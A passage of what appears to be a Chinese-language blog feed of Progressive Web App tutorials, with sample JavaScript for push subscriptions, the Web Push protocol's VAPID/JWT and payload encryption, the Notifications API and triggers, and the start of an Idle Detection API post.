class="string">&quot;/&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 4. 使用 PushManager 訂閱推播</span></span><br><span class="line">  <span class="keyword">const</span> subscription = <span class="keyword">await</span> register.<span class="property">pushManager</span>.<span class="title function_">subscribe</span>(&#123;</span><br><span class="line">    <span class="attr">userVisibleOnly</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">applicationServerKey</span>: <span class="title function_">urlBase64ToUint8Array</span>(publicVapidKey),</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 5. 向 Sever 發送訂閱</span></span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/subscribe&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(subscription),</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>在 serviceWorker 中依照資料格式處理 push 事件，這裡的例子為<a href="https://linyencheng.github.io/2021/09/25/progressive-web-application/pwa-notification/?utm_source=link&utm_medium=article&utm_campaign=internal_link">顯示通知</a></li></ol><ul><li>字串: <code>event.data.text()</code></li><li>JSON: <code>event.data.json()</code></li><li>blob: <code>event.data.blob()</code></li><li>arrayBuffer: <code>event.data.arrayBuffer()</code></li></ul><ol start="7"><li>透過 <code>event.waitUntil()</code> 等待通知執行完成</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;push&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = event.<span class="property">data</span>.<span class="title function_">json</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> promiseChain = self.<span class="property">registration</span>.<span class="title function_">showNotification</span>(data.<span class="property">title</span>, &#123;</span><br><span class="line">    <span class="attr">body</span>: <span class="string">&quot;Yay it works!&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  event.<span class="title function_">waitUntil</span>(promiseChain);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="推播通知協定"><a href="#推播通知協定" class="headerlink" title="推播通知協定"></a>推播通知協定</h2><p>之前已經可以用後端的套件去實作推播的伺服器，但那個套件實際上做了哪些事情?</p><ul><li>金鑰對 Application server keys</li><li>傳輸內容加密 Payload Encryption</li><li>Header 參數配置</li></ul><p>流程如下圖，相關定義可參考連結:<br><a href="https://datatracker.ietf.org/doc/html/draft-ietf-webpush-encryption">https://datatracker.ietf.org/doc/html/draft-ietf-webpush-encryption</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+-------+           +--------------+       +-------------+</span><br><span class="line">|  UA   |           | Push Service |       | Application |</span><br><span class="line">+-------+           +--------------+       +-------------+</span><br><span class="line">    |                      |                      |</span><br><span class="line">    |        Setup         |                      |</span><br><span class="line">    |&lt;====================&gt;|                      |</span><br><span class="line">    |           Provide Subscription              |</span><br><span class="line">    |--------------------------------------------&gt;|</span><br><span class="line">    |                      |                      |</span><br><span class="line">    :                      :                      :</span><br><span class="line">    |                      |     Push Message     |</span><br><span class="line">    |    Push Message      |&lt;---------------------|</span><br><span class="line">    |&lt;---------------------|                      |</span><br><span class="line">    |                      |                      |</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也因為定義了標準協議的關係，所以有了各語言的實作版本:</p><ul><li>Nodejs: <a href="https://github.com/web-push-libs/web-push">web-push-nodejs</a></li><li>PHP: <a href="https://github.com/web-push-libs/web-push-php">web-push-php</a></li><li>C#: <a href="https://github.com/web-push-libs/web-push-csharp">web-push-csharp</a></li><li>Java: <a href="https://github.com/web-push-libs/webpush-java">web-push-java</a></li><li>Python: <a href="https://github.com/web-push-libs/pywebpush">web-push-python</a></li></ul><h3 id="金鑰對-Application-server-keys"><a href="#金鑰對-Application-server-keys" class="headerlink" title="金鑰對 Application server keys"></a>金鑰對 Application server keys</h3><ul><li>密鑰: 推播服務使用</li><li>公鑰: 用戶端使用</li></ul><p>密鑰會用來檢查訂閱的用戶身分公鑰是否符合，<code>pushManager.subscribe()</code> 會用公鑰來檢查接收到的<strong>簽章訊息</strong>是否由與公鑰相關的私鑰簽出來的。</p><p><strong>簽章訊息</strong>的傳遞會透過 JWT 放在 header 進行資料交換，一個 JWT 會由三段字串組成並由 <code>.</code> 號分隔 <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGVzdCJ9.zTWqeQdfDM0WKGBFig2-VmUpTLkIQ4DvAJN6_LzDZzU</code>，前兩個字串（JWT info 和 JWT data）是經過 base64 編碼的 JSON ，所以其實是公開可閱讀的。</p><p>想要解密 JWT，可以直接用官方網站提供的介面。<br><a href="https://jwt.io/">https://jwt.io/</a></p><ol><li>JWT 訊息: 會記錄用哪種算法簽章</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;//&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>JWT 資料: 看程式設計上想要帶什麼資料會放在這邊，推播的話會有三個欄位 aud、exp、sub，透過這三個參數和 vapid 產生工具就能夠產生金鑰對</li></ol><ul><li>aud: 推播服務來源</li><li>exp: JWT 到期時間</li><li>sub: 推播訊息的人的聯絡訊息</li></ul><p><a href="https://github.com/web-push-libs/vapid">https://github.com/web-push-libs/vapid</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;//&quot;</span><span class="punctuation">:</span> <span class="string">&quot;`eyJuYW1lIjoidGVzdCJ9&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://YourSiteHere.example&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mailto://admin@YourSiteHere.example&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1457718878</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>最後的 header 就會像是 <code>Authorization: &#39;WebPush &lt;JWT Info&gt;.&lt;JWT Data&gt;.&lt;Signature&gt;&#39;</code></p><h3 id="傳輸內容加密"><a href="#傳輸內容加密" class="headerlink" title="傳輸內容加密"></a>傳輸內容加密</h3><p>推播的訊息不能赤裸裸的傳遞，所以在加密上也有定義相關規範，我也看不是很懂，總體來說就是套了加密、加鹽、金鑰對搭配使用，執行加密的時候最後也加上填充，避免被用長度推斷。</p><ul><li>ECDH (elliptic-curve Diffie-Hellman): 透過運算去發現原來我們是天生一對，數學假設如下<ul><li>y^2 &#x3D; x^3 + ax + b</li><li>4a^3 + 27b^2 !&#x3D; 0</li></ul></li></ul><p>看不懂也沒關係可以看影片，但我相信看完影片可能還是只懂概念。<br><a href="https://youtu.be/F3zzNa42-tQ">https://youtu.be/F3zzNa42-tQ</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> keyCurve = crypto.<span class="title function_">createECDH</span>(<span class="string">&quot;prime256v1&quot;</span>);</span><br><span class="line">keyCurve.<span class="title function_">generateKeys</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> publicKey = keyCurve.<span class="title function_">getPublicKey</span>();</span><br><span class="line"><span class="keyword">const</span> privateKey = keyCurve.<span class="title function_">getPrivateKey</span>();</span><br></pre></td></tr></table></figure><ul><li>HKDF (Hashed Message Authentication Code): SHA-256<ul><li>Salt: 16 byte authentication secret</li><li>IKM: shared secret</li><li>info</li><li>length</li></ul></li><li>Nonce: 加密通信只能使用一次的數字，可能是一個隨機或偽隨機數，以避免重送攻擊</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hkdf</span>(<span class="params">salt, ikm, info, length</span>) &#123;</span><br><span class="line">  <span class="comment">// ikm 加鹽</span></span><br><span class="line">  <span class="keyword">const</span> keyHmac = crypto.<span class="title function_">createHmac</span>(<span class="string">&quot;sha256&quot;</span>, salt);</span><br><span class="line">  keyHmac.<span class="title function_">update</span>(ikm);</span><br><span class="line">  <span class="keyword">const</span> key = keyHmac.<span class="title function_">digest</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// info 加密</span></span><br><span class="line">  <span class="keyword">const</span> infoHmac = crypto.<span class="title function_">createHmac</span>(<span class="string">&quot;sha256&quot;</span>, key);</span><br><span class="line">  infoHmac.<span class="title function_">update</span>(info);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">ONE_BUFFER</span> = <span class="keyword">new</span> <span class="title class_">Buffer</span>(<span class="number">1</span>).<span class="title function_">fill</span>(<span class="number">1</span>);</span><br><span class="line">  infoHmac.<span class="title function_">update</span>(<span class="variable constant_">ONE_BUFFER</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 長度控制</span></span><br><span class="line">  <span class="keyword">return</span> infoHmac.<span class="title function_">digest</span>().<span class="title function_">slice</span>(<span class="number">0</span>, length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nonce = <span class="title function_">hkdf</span>(salt, prk, nonceInfo, <span class="number">12</span>);</span><br><span class="line"><span class="keyword">const</span> contentEncryptionKey = <span class="title function_">hkdf</span>(salt, prk, cekInfo, <span class="number">16</span>);</span><br></pre></td></tr></table></figure><ul><li><p>使用者裝置:</p><ul><li>ecdh_secret &#x3D; ECDH(ua_private, as_public)</li><li>auth_secret &#x3D; random(16)</li><li>salt &#x3D; header 來的</li></ul></li><li><p>伺服器:</p><ul><li>ecdh_secret &#x3D; ECDH(as_private, ua_public)</li><li>auth_secret &#x3D; user agent 來的</li><li>salt &#x3D; random(16)</li></ul></li></ul><h3 id="Header-參數配置"><a href="#Header-參數配置" class="headerlink" title="Header 參數配置"></a>Header 參數配置</h3><ul><li>TTL header (time to live): 訊息能在推播服務上存活多久</li><li>Topic: 同個主題下可以實作舊訊息取代新訊息</li><li>Urgency: 訊息的重要程度</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App Notification</title>
      <link href="/2021/09/25/progressive-web-application/pwa-notification/"/>
      <url>/2021/09/25/progressive-web-application/pwa-notification/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Web-Notifications-API"><a href="#什麼是-Web-Notifications-API" class="headerlink" title="什麼是 Web Notifications API?"></a>什麼是 Web Notifications API?</h2><p>透過 Web Notifications API 可以讓 Progressive Web App 發出系統層級的通知，搭配 service worker 背景執行的特性，就可以做到 App 的背景推播通知。</p><p>下一篇文章小編會完整開箱<a href="https://linyencheng.github.io/2021/09/26/progressive-web-application/pwa-push-notificatoin-introduction/?utm_source=link&utm_medium=article&utm_campaign=internal_link">怎麼實作前後端的網站推播通知</a>。</p><p>底下連結提供基本的推播示範:<br><a href="https://linyencheng-push-notification.herokuapp.com/">https://linyencheng-push-notification.herokuapp.com/</a></p><h2 id="怎麼使用-Web-Notifications-API"><a href="#怎麼使用-Web-Notifications-API" class="headerlink" title="怎麼使用 Web Notifications API?"></a>怎麼使用 Web Notifications API?</h2><p>首先網頁須被配置在 https 的環境下，再來當瀏覽器透過 API 操作到網頁本身以外的東西都需要權限，像是位置、鏡頭、麥克風、系統通知等都是。</p><p>原則上也是只要 <code>Notification</code> 有存在就可以要求權限並使用，另外透過 <code>Notification.permission</code> 可以查看目前狀態，要求權限的程式碼如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;Notification&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>) &#123;</span><br><span class="line">  <span class="title class_">Notification</span>.<span class="title function_">requestPermission</span>().<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以寫成函式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkNotificationPromise</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title class_">Notification</span>.<span class="title function_">requestPermission</span>().<span class="title function_">then</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在已安裝的 App 中可以透過 manifest 檔案來直接增加配置，也可以開啟相關權限:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;desktop-notification&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allows to display notifications on the user&#x27;s desktop.&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>要求通知權限 (圖片來源: <a href="https://blog.chromium.org/">https://blog.chromium.org/</a>)<br><img src="https://lh6.googleusercontent.com/cCNKwKz1AasRxWuN7gf6Rl_HGgOgmVvwKD1pICZa99AyKhsmK34quSRiHVuC0RqMpCTaDfsleOpsayzStXXIQQnwLWWFbtOgGVBHOGl3-VyNi8QIM8Cdm7PXXDE0AYWW3tSmgKcF" alt="要求通知權限"></p></blockquote><p>使用上也沒有太過複雜，就是 new 一個 Notification 就完成了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> n = <span class="keyword">new</span> <span class="title class_">Notification</span>(<span class="string">&quot;哈囉!&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> notification = <span class="keyword">new</span> <span class="title class_">Notification</span>(<span class="string">&quot;複雜一點&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&quot;描述&quot;</span>,</span><br><span class="line">  <span class="attr">icon</span>: <span class="string">&quot;/icon.png&quot;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Notifications-API-參數"><a href="#Notifications-API-參數" class="headerlink" title="Notifications API 參數"></a>Notifications API 參數</h3><p>視覺設計上主要有以下幾種參數，直接參考圖片:</p><blockquote><p>通知視覺參數對照 (圖片來源: <a href="https://developers.google.com/">https://developers.google.com</a>)<br><img src="https://developers.google.com/web/fundamentals/push-notifications/images/notification-ui.png"></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;String&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;icon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;URL String&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;URL String&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;badge&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;URL String&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;vibrate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;Array of Integers&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sound&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;URL String&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;String of &#x27;auto&#x27; | &#x27;ltr&#x27; | &#x27;rtl&#x27;&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>如果還是沒什麼感覺，底下有大大製作的產生器，直接試玩最快:<br><a href="https://tests.peter.sh/notification-generator/">https://tests.peter.sh/notification-generator/</a></p><h2 id="Notification-Triggers"><a href="#Notification-Triggers" class="headerlink" title="Notification Triggers"></a>Notification Triggers</h2><p>雖然目前已經有了通知的 API 但對於以時間 (time-based) 為觸發條件的事件相對還沒有那麼方便，Notification trigger 就是為了解決這個問題而出現的 API，未來也可能會有以地點為條件的觸發 API。</p><p>目前這個 API 還是實驗性的功能，需要自行從 Chrome <code>about://flags</code> 中開啟權限，將 <code>#enable-experimental-web-platform-features</code> 開啟。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;showTrigger&quot;</span> <span class="keyword">in</span> <span class="title class_">Notification</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">  <span class="comment">// 開啟後有存在就可以使用囉</span></span><br><span class="line">  <span class="comment">// 註冊</span></span><br><span class="line">  registration.<span class="title function_">showNotification</span>(</span><br><span class="line">    <span class="string">`Triggered for <span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">Date</span>.now() + sec * <span class="number">1000</span>).toLocaleTimeString()&#125;</span>`</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">tag</span>: <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>().<span class="title function_">substr</span>(<span class="number">2</span>),</span><br><span class="line">      <span class="attr">body</span>: <span class="string">`Scheduled at <span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toLocaleTimeString()&#125;</span>.`</span>,</span><br><span class="line">      <span class="attr">showTrigger</span>: <span class="keyword">new</span> <span class="title class_">TimestampTrigger</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() + sec * <span class="number">1000</span>),</span><br><span class="line">      <span class="attr">icon</span>: icon,</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> registration = <span class="keyword">await</span> navigator.<span class="property">serviceWorker</span>.<span class="title function_">getRegistration</span>();</span><br><span class="line">  <span class="keyword">const</span> notifications = <span class="keyword">await</span> registration.<span class="title function_">getNotifications</span>(&#123;</span><br><span class="line">    <span class="attr">includeTriggered</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 關閉全部</span></span><br><span class="line">  notifications.<span class="title function_">forEach</span>(<span class="function">(<span class="params">notification</span>) =&gt;</span> notification.<span class="title function_">close</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>教學文件中 Demo 的站台: <a href="https://notification-triggers.glitch.me/">https://notification-triggers.glitch.me/</a></p><h2 id="Permission-UX"><a href="#Permission-UX" class="headerlink" title="Permission UX"></a>Permission UX</h2><p>一個好的時機是在用戶完成關鍵行為或轉換後才進行提示，或是透過勾選的選項來觸發。</p><ol><li><p>在用戶完成關鍵行為或轉換後才透過提示手動觸發 (圖片來源: <a href="https://developers.google.com/">https://developers.google.com</a>)</p><blockquote><p><img src="https://developers.google.com/web/fundamentals/push-notifications/images/ux-examples/owen/owen-good-example.png"></p></blockquote></li><li><p>透過選項讓用戶手動觸發 (圖片來源: <a href="https://developers.google.com/">https://developers.google.com</a>)</p><blockquote><p><img src="https://developers.google.com/web/fundamentals/push-notifications/images/ux-examples/google-io/google-io-permission-prompt.png"><br><img src="https://developers.google.com/web/fundamentals/push-notifications/images/ux-examples/gauntface/gauntface-enabled.png"></p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 閒置中</title>
      <link href="/2021/09/24/progressive-web-application/pwa-idle-detection/"/>
      <url>/2021/09/24/progressive-web-application/pwa-idle-detection/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Idle-Detection-API"><a href="#什麼是-Idle-Detection-API" class="headerlink" title="什麼是 Idle Detection API"></a>什麼是 Idle Detection API</h2><p>Idle Detection API 的設計是當 App 被用戶閒置超過設定的時間時觸發，目前這個 API 還在提議的階段。</p><p>API 的相關文件: <a href="https://wicg.github.io/idle-detection/">https://wicg.github.io/idle-detection/</a></p><p>空閒檢測可以解決什麼問題?</p><ul><li>聊天的應用可以透過這個來顯示聯絡人狀態</li><li>博物館中公開互動的 Web App 若無人使用可以自動回到首頁</li><li><del>挖礦等級</del>耗費效能的運算可以等到閒置時執行</li></ul><p>在有這個 API 前其實有個 <code>visibilitychange</code> 事件能夠達到一半的目的，瀏覽器會偵測是否還 Focus 在當前的 Tab。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;visibilitychange&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">visibilityState</span> === <span class="string">&quot;visible&quot;</span>) &#123;</span><br><span class="line">    backgroundMusic.<span class="title function_">play</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    backgroundMusic.<span class="title function_">pause</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="怎麼使用-Idle-Detection-API"><a href="#怎麼使用-Idle-Detection-API" class="headerlink" title="怎麼使用 Idle Detection API"></a>怎麼使用 Idle Detection API</h2><p>主要是透過用戶、螢幕兩方面去偵測</p><ul><li>用戶空閒狀態：停止操作 (active 或 idle)</li><li>螢幕空閒狀態：螢幕鎖定（locked 或 unlocked）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enum <span class="title class_">UserIdleState</span> &#123;</span><br><span class="line">    <span class="string">&quot;active&quot;</span>,</span><br><span class="line">    <span class="string">&quot;idle&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">enum <span class="title class_">ScreenIdleState</span> &#123;</span><br><span class="line">    <span class="string">&quot;locked&quot;</span>,</span><br><span class="line">    <span class="string">&quot;unlocked&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>直接看官方的範例:</p><ol><li>看瀏覽器是否存在 API</li><li>取得相關權限</li><li>New 一個 IdleDetector，最小的 threshold 目前是 60 秒</li><li>可以透過 abort 去終止</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">main</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 有就可以用</span></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&quot;IdleDetector&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;IdleDetector is not available.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 但還是需要先取得權限</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">await</span> <span class="title class_">IdleDetector</span>.<span class="title function_">requestPermission</span>()) !== <span class="string">&quot;granted&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Idle detection permission not granted.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> controller = <span class="keyword">new</span> <span class="title class_">AbortController</span>();</span><br><span class="line">    <span class="keyword">const</span> signal = controller.<span class="property">signal</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> idleDetector = <span class="keyword">new</span> <span class="title class_">IdleDetector</span>();</span><br><span class="line">    idleDetector.<span class="title function_">addEventListener</span>(<span class="string">&quot;change&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">        <span 